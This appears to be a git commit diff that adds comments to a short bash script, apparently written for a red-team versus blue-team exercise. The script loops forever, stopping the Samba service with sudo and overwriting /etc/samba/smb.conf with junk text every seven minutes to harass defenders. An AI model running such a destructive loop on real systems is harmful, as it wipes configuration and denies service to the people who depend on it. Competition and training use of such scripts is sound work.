140d1cbefc112816a809856d8896babd71c567c0
mattr555-r <64177813+mattr555-r@users.noreply.github.com>
2023-04-02 17:05:11 -0400

    Update testscript.sh

--- testscript.sh
+++ testscript.sh
@@ -1,8 +1,12 @@
 #!/bin/bash
 
+# Loop forever
 while true
 do
+ # Stop the smb service and overwrite the config file
  sudo service smbd stop
  echo "I'm Batman" > '/etc/samba/smb.conf'
+ 
+ #Sleep for 7 minutes, enough time for the blue team to figure out that the service is down and try to fix it. Then repeat.
  sleep 420
 done
